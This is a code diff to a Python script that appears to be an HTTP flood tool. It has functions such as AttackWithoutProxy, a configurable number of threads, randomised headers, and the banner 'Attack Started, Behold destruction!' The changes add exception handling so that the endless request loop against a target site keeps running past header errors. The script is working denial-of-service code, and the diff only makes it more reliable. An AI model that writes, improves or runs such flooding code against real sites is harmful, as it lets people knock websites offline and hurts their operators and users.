@@ -63,8 +63,10 @@ def AttackWithoutProxy():
     while True:
         try:
             requests.get(site, headers=set_headers())
+        except requests.exceptions.InvalidHeader:
+            continue
         except KeyboardInterrupt:
-            exit(0)
+            sys.exit(0)
 
 
 print()
@@ -85,6 +87,10 @@ else:
 try:
     print(f"{C}Checking authenticity of the url{W}")
     requests.get(site)
+
+except KeyboardInterrupt:
+    sys.exit(0)
+
 except Exception as e:
     print(e)
     exit()
@@ -100,7 +106,7 @@ else:
         threads = int(threads)
     except ValueError:
         print(f"{R}A number was expected{W}")
-        exit()
+        sys.exit(0)
 
     if int(threads) <= 0:
         print(f"{R}Number of threads cannot be < 1{W}")
@@ -113,4 +119,9 @@ print(f"{C}Attack Started, Behold destruction!{W}")
 
 # main thread
 while True:
-    requests.get(site, headers=set_headers())
+    try:
+        requests.get(site, headers=set_headers())
+    except requests.exceptions.InvalidHeader:
+        continue
+    except KeyboardInterrupt:
+        sys.exit(0)
